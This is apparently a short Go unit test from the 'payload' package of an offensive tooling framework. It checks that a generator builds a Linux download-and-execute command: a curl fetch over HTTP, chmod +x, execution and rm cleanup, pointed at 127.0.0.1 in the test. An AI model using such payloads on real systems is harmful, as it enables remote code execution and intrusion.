package payload

import (
	"strings"
	"testing"
)

func TestLinuxCurlHTTPDownloadAndExecute(t *testing.T) {
	curlCommand := LinuxCurlHTTPDownloadAndExecute("127.0.0.1", 1270, "helloworld")

	if !strings.HasPrefix(curlCommand, "curl -s -o") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "http://") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "chmod +x") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "rm ") {
		t.Fatal(curlCommand)
	}

	t.Log(curlCommand)
}
